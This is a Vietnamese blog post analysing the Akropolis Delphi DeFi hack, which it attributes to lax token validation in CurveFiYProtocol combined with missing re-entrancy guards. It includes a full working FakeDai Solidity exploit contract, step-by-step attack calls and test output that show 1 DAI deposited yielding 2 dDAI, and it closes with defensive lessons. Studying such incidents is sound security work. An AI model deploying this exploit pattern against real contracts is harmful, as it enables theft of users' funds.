### Tổng quan 

![](https://images.viblo.asia/ac1db718-6bca-497c-a8e4-c391d38f2873.png)

Service Delphi của Akropolis là nền tảng Defi cho phép người dùng deposit ERC20 vào Pool, chẳng hạn như  DAI, để đổi lấy token tiền thưởng của Pool - dDAI, sau một thời sẽ dùng dDAI để withdraw lượng DAI lúc đầu đã deposit vào + lãi.
Delphi cho phép người dùng có thể tùy chọn Protocol mà họ muốn dùng để deposit vào Pool, mỗi Protocol sẽ có cách validate và tính toán khác nhau.

Mình sẽ không giới thiệu nhiều về hệ thống Akropolis, mọi người có thể tìm hiểu thêm [tại đây](https://wiki.akropolis.io/delphi/).

Sự cố xảy ra với Delphi được xác định là do 2 nguyên nhân cơ bản:

1. Cơ chế validate token đầu vào của protocol CurveFiY chưa chặt, từ đó hacker có thể dễ dàng một cuộc gọi đến một contract độc hại.
2. Không chống reentrance cho các function deposit() và withdraw().

Kết hợp 2 lỗ hổng trên, hacker đã tấn công theo cơ chế deposit vào 1 DAI nhưng lại được mint ra tận 2 dDAI, sau đó lại dùng 2 dDAI rút ra 2 DAI, tức nhiều gấp đôi lượng DAI thực tế đã deposit vào. Thực hiện nhiều lần như thế, hacker đã ăn cắp 2 triệu DAI, tương đương 2 triệu USD của Akropolis.

Thông tin chi tiết giao dịch có thể xem [tại đây](https://ethtx.info/mainnet/0xe1f375a47172b5612d96496a4599247049f07c9a7d518929fbe296b0c281e04d)

Đây là [link](https://github.com/trinhtan/akropolis) repo bao gồm smart contract của Delphi và các bước tái hiện lại vụ tấn công mà mình đã chuẩn bị, mọi người có thể clone về theo dõi song song với bài viết.

### So sánh 2 protocol Compound và CurveFi

Như mình đã nói ở trên, Delphi cho phép người dùng deposit DAI vào Pool theo nhiều Protocol khác nhau, nhìn vào function ```function deposit(address _protocol, address[] memory _tokens, uint256[] memory _dnAmounts)``` trong file ```contracts/modules/savings/SavingsModule.sol```:
```js
function deposit(address _protocol, address[] memory _tokens, uint256[] memory _dnAmounts)
    public operationAllowed(IAccessModule.Operation.Deposit)
    returns(uint256) 
    {
        ...
        depositToProtocol(_protocol, _tokens, _dnAmounts);
        ...
    }
```
người dùng sẽ chọn Protocol mà họ muốn dùng thông qua tham số ```addresss _protocol```, sau đó bên trong hàm ```deposit()``` sẽ gọi đến ```depositToProtocol(_protocol, _tokens, _dnAmounts)```:
```js
function depositToProtocol(address _protocol, address[] memory _tokens, uint256[] memory _dnAmounts) internal {
    require(_tokens.length == _dnAmounts.length, "SavingsModule: count of tokens does not match count of amounts");
        for (uint256 i=0; i < _tokens.length; i++) {
            address tkn = _tokens[i];
            IERC20(tkn).safeTransferFrom(_msgSender(), _protocol, _dnAmounts[i]);
            IDefiProtocol(_protocol).handleDeposit(tkn, _dnAmounts[i]);
            emit DepositToken(_protocol, tkn, _dnAmounts[i]);
        }
    }
```

trong hàm ```depositToProtocol()```  có 2 bước quan trọng được  thực hiện:

1. ```IERC(tkn).safeTransferFrom(_msgSender(), _protocol, _dnAmounts[i])```, function này cho phép thực hiện 1 low-call đến function ```transferFrom()``` đến smart contract của token được deposit vào
2. ```IDefiProtocol(_protocol).handleDeposit(tkn, _dnAmounts[i])```, hàm này gọi đến function ```handleDeposit()``` của protocol mà người dùng đã chọn.

Ta sẽ xem mã nguồn của 2 protocol Compound và CurveFiY:
```js
# CompoundProtocol
function handleDeposit(address token, uint256 amount) public onlyDefiOperator {
        require(token == address(baseToken), "CompoundProtocol: token not supported");
        cToken.mint(amount);
}
```

như vậy, khi hacker chọn protocol là CompoundProtocol và thực hiện deposit một token mà không phải là DAI thì sẽ bị vướng vào cái ```require(token == address(baseToken), "CompoundProtocol: token not supported")``` mà ở đây ```baseToken``` chính là DAI, do đó transaction sẽ bị revert và ko thể có cuộc tấn công nào xảy ra.

```js
# CurveFiYProtocol
function handleDeposit(address token, uint256 amount) public onlyDefiOperator {
        uint256[] memory amounts = new uint256[](nCoins());
        for (uint256 i=0; i < _registeredTokens.length; i++){
            amounts[i] = IERC20(_registeredTokens[i]).balanceOf(address(this)); // Check balance which is left after previous withdrawal
            //amounts[i] = (_registeredTokens[i] == token)?amount:0;
            if (_registeredTokens[i] == token) {
                require(amounts[i] >= amount, "CurveFiYProtocol: requested amount is not deposited");
            }
        }
        deposit_add_liquidity(amounts, 0);
        stakeCurveFiToken();
 }
```

khi hacker chọn protocol là CurveFiYProtocol và thực hiện deposit một FakeDai không phải là một trong 4 token của protocol này là DAI, USDC, BUSD, USDT (các bạn có thể tìm hiểu thêm về CurveFI để hiểu rõ đoạn này) thì vẫn dễ dàng pass qua được do cái ```require(amounts[i] >= amount, "CurveFiYProtocol: requested amount is not deposited")``` bị đặt trong ```if(_registeredTokens[i] == token)``` mà token lại là FakeDai không phải một trong 4 DAI, USDC, BUSD, USDT nên sẽ không bao giờ chạy vào ```if``` này.

> Lưu ý ở đây là CurveFiYProtocol có lỗ hổng trong trường hợp sử dụng của Delphi Akropolis không có nghĩa là nó cũng có lỗ hổng trong trường hợp sử dụng của CurveFiY, mỗi nền tảng có nhiều module khác nhau nên logic này có thể chặt chẽ trong context CurveFi vì nó còn được hỗ trợ bởi nhiều module khác, chỉ trách là Akropolis đã sử dụng lại mà không xem xét kỹ nó có chặt chẽ với các module của mình hay không nên mới gây ra lỗ hổng này.

### Vấn đề chống Reentrance
Đa số các nền tảng Defi ngày nay, tất cả các function liên quan để việc chuyển tiền vào và rút tiền ra đều được đặt một ```modifier``` là  ```nonReentrant``` đươc phát triển trong smart contract ```ReentrancyGuard.sol``` của ```openzeppelin```, các bạn có thể xem thêm [tại đây](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol).

việc sử dụng ```nonReentrant``` được hiểu đơn giản là trong một transaction, số lần gọi đến function được đặt ```nonReentrant``` tối đa là một, ví dụ có smart contract như sau:
```js
import "@openzeplin/contracts/utils/ReentrancyGuard.sol";
contract SampleContract ís ReentrancyGuard {

    function a() public nonReentrant {
        ...
    }
    
    function b() public nonReentrant {
        ...
    }
}
```
thì trong một transaction, không thể nào gọi đến function ```a()``` 2 lần, hoặc function ```b()``` 2 lần, hoặc vừa gọi đến function ```a()``` vừa gọi đến function ```b()```.

Các nền tảng Defi sử dụng ```nonReentrant``` để đề phòng các cuộc gọi lại độc hại như vừa ```withdraw()``` ra lại ```deposit()``` vào hoặc ```deposit()``` và ```withdraw()``` đệ quy làm ảnh hưởng xấu đến các thông tin liên quan đến tiền bạc được lưu trong smart contract. 

Mình thật không hiểu sao Delphi Akrolpolis lại tự tin đến mức không dùng ```nonReentract``` để xảy ra cớ sự như ngày hôm nay.

### Tấn công bằng FAKEDAI
Giới thiệu lan man thế đủ rồi,bây giờ mình sẽ tái hiện lại vụ hack. 
![](https://images.viblo.asia/89797c37-d6ef-4d54-a964-2bacc9c6396d.png)

Đây là các bước của cuộc tấn công:
1. Hacker gọi ```deposit(CurverFiYProtocol, [FakeDai], [amount])``` của SavingsModule
2. SavingsModule gọi lại ```transferFrom()``` của FakeDai, mà thực chất bên trong hàm ```transferFrom()``` của FakeDai lại gọi lại hàm deposit của SavingsModule (tác hại của việc không dùng ```nonReentrant```) nhưng lúc này lại là dùng DAI thật ```deposit(CurveFiYProtocol, [DAI], [amount])```.
3. SavingsModule mint ra một lượng dDAI tương ứng với việc đã deposit bằng DAI thật
4. Thoát ra khỏi context deposit DAI thât,  quay lại với context deposit FakeDai ban đầu lại pass qua được function ```handleDeposit()``` của CurveFiProtocol như mình đã nói ở trên, sau khi tính toán lại các tham số, SavingsModule lại mint thêm một lượng dDAI nữa

=> chỉ 1 DAI phải deposit vào, hacker lại sở hữu 2 dDAI tương ứng với 2 DAI, với cơ chế đó hắn đã thực hiện nhiều transaction tấn công tốn 25,000 DAI nhưng lại lấy về lượng 50,000 dDAI tương ứng với 50,000 DAI, tích lũy sau nhiều transaction, hắn đã rút về 2 triệu DAI ở cú chót :D

Chắc mọi người đang có suy nghĩ, muốn thực hiện một transaction thì phải có vốn là 25,000 DAI nhỉ ? Với nhiều nền tảng cung cấp dịch vụ ```flashLoan``` (vay và trả ngay trong 1 transaction) như hiện nay và cộng với việc không có ```nonReentrant```thì hacker hoàn toàn có thể vay nóng 25,000 DAI để ```deposit()``` vào và thu 50,000 dDAI sau đó chỉ dùng 25,000 dDAI để ```withdraw()``` về 25,000 DAI và trả cho bên cho vay, sau một transaction hắn lãi được 25,000 dDAI tương ứng với 25,000 DAI.

Mã nguồn của FakeDai
```js
pragma solidity ^0.5.12;

import "@openzeppelin/upgrades/contracts/ownership/Ownable.sol";
import "@openzeppelin/contracts-ethereum-package/contracts/token/ERC20/IERC20.sol";

interface Savings {
    function deposit(
        address _protocol,
        address[] calldata _tokens,
        uint256[] calldata _dnAmounts
    ) external returns (uint256);

    function withdraw(address _protocol, address token, uint256 dnAmount, uint256 maxNAmount) external returns(uint256);
}


contract FakeDai is OpenZeppelinUpgradesOwnable {

    address[] public tokens;
    uint256[] public amounts;
    address public protocol;
    address public savings;

    constructor() public {
    }

    function setup(address _realDai, address _protocol, address _savings, uint256 _amount) onlyOwner public {
        address[] memory tempTokens;
        tokens = tempTokens;
        tokens.push(_realDai);

        uint256[] memory tempAmounts;
        amounts = tempAmounts;
        amounts.push(_amount);

        protocol = _protocol;
        savings = _savings;
    }

    function attack(address[] memory fakeTokens, uint256[] memory fakeAmounts) onlyOwner public {
        Savings(savings).deposit(protocol, fakeTokens, fakeAmounts);
    }

    function withdrawAttack(uint256 amount) onlyOwner public {
        Savings(savings).withdraw(protocol, tokens[0], amount, 0);
    }

    function withdrawDAIToAttacker(address reciever, uint256 amount) onlyOwner public {
        IERC20(tokens[0]).transfer(reciever, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {

        IERC20(tokens[0]).approve(savings, amounts[0]);
        Savings(savings).deposit(protocol, tokens, amounts);

        return true;
    }
}
```

Ở contract FakeDai này mình sẽ bỏ qua bước flashLoan() và mình sẽ chuyển 1 DAI từ ngoài cho FakeDai để làm vốn, và việc attack() và withdraw() về sẽ được gọi trong 2 transaction khác nhau, vì mục đích chính của mình chỉ là tái hiện lại việc ```deposit()``` 1 DAI nhưng lại được mint ra 2 dDAI.

Các bước setup môi trường mình và tấn công mình đã chuẩn bị sẵn trong file ```attack/attack.test.js``` ở repo mình đặt ở trên, các bạn chỉ cần chạy:
```bash
yarn attack
```
là nó sẽ chạy từ đầu đến cuối và in ra kết quả ra màn hình:
```bash
Attack

1000000000000000000 DAI balance of Attack Contract before attack
1000000000000000000 DAI balance of User before deposit
1000000000000000000 DAI balance of User after withdraw
2000000000000000000 DAI balance of Attack Contract after Attack
2000000000000000000 DAI balance of Attacker after withdraw
```

với user bình thường, user với vốn ban đầu là 1 DAI, deposit vào rút ra được 1 DAI, còn hacker với vốn là 1 DAI đã lấy về 2 DAI

Sau khi setup môi trường đúng với môi trường của Delphi, chúng ta thực hiện các bước sau để tấn công:

1. Deploy FakeDai contract
2. Gọi hàm ```setup(DAI, curveFiYProtocol, savingsModule, '1000000000000000000')```
3. Gọi hàm ```attack([FakeDai], ['1000000000000000000'])```
4. Gọi hàm ```withdrawAttack('2000000000000000000')``` để lấy DAI về cho FakeDai
5.Gọi hàm ```withdrawDAIToAttacker(attacker, '2000000000000000000')``` để lấy DAI về cho attacker

### Tổng kết 
Sau vụ tấn công này, với đúc kết riêng của cá nhân, mình xin đưa ra một số ý như sau để bảo mật tốt hơn cho smart contract, vì trong Blockchain một khi incident đã xảy ra thì giá trị thiệt hại là rất lớn và không thể nào đảo ngược lại để khắc phục được:
- Luôn dùng ```nonReentrant``` cho các function ```extenal``` và ```public``` nếu nó không làm ảnh hưởng đến business model của hệ thống
- Khi dùng lại module của một bên nào đó, phải xem xét lại thật kỹ, nó an toàn đối với họ không có nghĩa là nó an toàn đối với mình
- Validate rõ ràng, thừa còn hơn phải mất tiền.
### Link tham khảo
https://peckshield.medium.com/akropolis-incident-root-cause-analysis-c11ee59e05d4

https://github.com/trinhtan/akropolis